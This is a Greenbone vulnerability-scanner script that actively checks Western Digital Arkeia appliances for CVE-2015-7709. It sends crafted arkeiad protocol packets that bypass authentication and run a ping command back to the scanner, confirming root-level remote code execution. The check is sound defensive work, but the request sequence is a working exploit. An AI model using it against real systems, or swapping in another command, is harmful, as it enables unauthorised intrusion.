# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:arkeia:western_digital_arkeia";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107041");
  script_version("2024-11-13T05:05:39+0000");
  script_tag(name:"last_modification", value:"2024-11-13 05:05:39 +0000 (Wed, 13 Nov 2024)");
  script_tag(name:"creation_date", value:"2016-08-16 13:16:06 +0200 (Tue, 16 Aug 2016)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2015-7709");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Western Digital Arkeia <= v11.0.12 RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("General");
  script_dependencies("gb_arkeia_virtual_appliance_detect_617.nasl", "os_detection.nasl");
  script_mandatory_keys("ArkeiaAppliance/installed");
  script_require_ports("Services/arkeiad", 617);

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Jul/54");

  script_tag(name:"summary", value:"The Western Digital Arkeia Appliance is affected by a remote
  code execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted request using the ARKFS_EXEC_CMD function and
  checks if the target is connecting back to the scanner host.

  Note: For a successful detection of this flaw the scanner host needs to be able to directly
  receive ICMP echo requests from the target.");

  script_tag(name:"insight", value:"The insufficient checks on the authentication of all clients in
  arkeiad daemon can be bypassed.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary commands with root or SYSTEM privileges.");

  script_tag(name:"affected", value:"Western Digital Arkeia Appliance version 11.0.12 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  exit(0);
}

include("dump.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("list_array_func.inc");
include("pcap_func.inc");

function arkeiad_recv( soc ) {

  local_var soc, len, r;

  r = recv( socket:soc, length:8 );

  if( ! r || strlen( r ) < 8 )
    return;

  len = ord( r[7] );
  if( ! len || len < 1 )
    return r;

  r += recv( socket:soc, length:len );
  return r;
}

if( ! port = get_app_port( cpe:CPE, service:"arkeiad" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

ownhostname = this_host_name();
ownip = this_host();
src_filter = pcap_src_ip_filter_from_hostnames();
dst_filter = string( "(dst host ", ownip, " or dst host ", ownhostname, ")" );
filter = string( "icmp and icmp[0] = 8 and ", src_filter, " and ", dst_filter );

if( os_host_runs( "Windows") == "yes" )
  target_runs_windows = TRUE;

foreach connect_back_target( make_list( ownip, ownhostname ) ) {

  # nb: Always keep open_sock_tcp() after the first call of a function forking on multiple hostnames /
  # vhosts (e.g. http_get(), http_post_put_req(), http_host_name(), get_host_name(), ...). Reason: If
  # the fork would be done after calling open_sock_tcp() the child's would share the same socket
  # causing race conditions and similar.
  #
  # In this case this also includes pcap_src_ip_filter_from_hostnames() from above.
  if( ! soc = open_sock_tcp( port ) )
    continue;

  req = raw_string( 0x00, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70 ) +
        crap( data:raw_string( 0 ), length:12 ) +
        raw_string( 0xc0, 0xa8, 0x02, 0x8a ) +
        crap( data:raw_string( 0 ), length:56 ) +
        raw_string( 0x8a, 0x02, 0xa8 ) +
        raw_string( 0xc0, 0x41, 0x52, 0x4b, 0x46, 0x53 ) + # "ARKFS"
        raw_string( 0x00 ) +
        raw_string( 0x72, 0x6f, 0x6f, 0x74 ) + # "root"
        raw_string( 0x00 ) +
        raw_string( 0x72, 0x6f, 0x6f, 0x74 ) + # "root"
        crap( data:raw_string( 0 ), length:3 ) +
        raw_string( 0x34, 0x2e, 0x33, 0x2e, 0x30, 0x2d, 0x31 ) + # "4.3.0-1"
        crap( data:raw_string( 0 ), length:11 );
  send( socket:soc, data:req );
  res = arkeiad_recv( soc:soc );
  if( ! res || raw_string( 0x00, 0x60, 0x00, 0x04 ) >!< res ) {
    close( soc );
    continue;
  }

  req2 = raw_string( 0x00, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x32 ) +
         crap( data:raw_string( 0 ), length:11 );

  send( socket:soc, data:req2 );
  res2 = arkeiad_recv( soc:soc );
  if( ! res2 || raw_string( 0x00, 0x60, 0x00, 0x04 ) >!< res2 ) {
    close( soc );
    continue;
  }

  req3 = raw_string( 0x00, 0x61, 0x00, 0x04, 0x00, 0x01, 0x00, 0x1a,
                     0x00, 0x00, 0x31, 0x33, 0x39, 0x32, 0x37, 0x31,
                     0x32, 0x33, 0x39, 0x38, 0x00, 0x45, 0x4e ) +
         crap( data:raw_string( 0 ), length:11 );
  send( socket:soc, data: req3 );
  res3 = arkeiad_recv( soc:soc );
  if( ! res3 || raw_string( 0x00, 0x43, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00 ) >!< res3 ) {
    close( soc );
    continue;
  }

  req4 = raw_string( 0x00, 0x62, 0x00, 0x01, 0x00, 0x02, 0x00, 0x1b,
                     0x41, 0x52, 0x4b, 0x46, 0x53, 0x5f, 0x45, 0x58,
                     0x45, 0x43, 0x5f, 0x43, 0x4d, 0x44, 0x00, 0x31 ) +
         crap( data:raw_string( 0 ), length:11 );
  send( socket:soc, data:req4 );
  res4 = arkeiad_recv( soc:soc );
  if( ! res4 || raw_string( 0x00, 0x43, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00 ) >!< res4 ) {
    close( soc );
    continue;
  }

  vtstrings = get_vt_strings();
  vtcheck = vtstrings["ping_string"];

  if( target_runs_windows )
    command = "ping -n 5 " + connect_back_target;
  else
    command = "ping -c 5 -p " + hexstr( vtcheck ) + " " + connect_back_target;

  cmdlen = raw_string( strlen( command ) );

  req5 = raw_string( 0x00, 0x63, 0x00, 0x04, 0x00, 0x03, 0x00, 0x15,
                     0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 0x30, 0x3a,
                     0x31, 0x2c ) +
         crap( data:raw_string( 0 ), length:12 ) +
         raw_string( 0x64, 0x00, 0x04, 0x00, 0x04, 0x00 ) +
         cmdlen +
         command +
         raw_string( 0x00 );

  send( socket:soc, data:req5 );
  for( i = 0; i < 3; i++ ) {

    res5 = send_capture( socket:soc, data:"", timeout:5, pcap_filter:filter );

    if( ! res5 )
      continue;

    type = get_icmp_element( icmp:res5, element:"icmp_type" );
    if( ! type || type != 8 )
      continue;

    # nb: If understanding https://datatracker.ietf.org/doc/html/rfc792 correctly the "data" field
    # should be always there. In addition at least standard Linux and Windows systems are always
    # sending data so it should be safe to check this here.
    if( ! data = get_icmp_element( icmp:res5, element:"data" ) )
      continue;

    if( ( target_runs_windows || vtcheck >< data ) ) {
      close( soc );
      report = 'By sending a special request it was possible to execute `' +  command + '` on the remote host.\n\nReceived answer (ICMP "Data" field):\n\n' + hexdump( ddata:data );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }

  close( soc );
}

# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
# host isn't reachable by the target host or another IP is responding from our request.
exit( 0 );
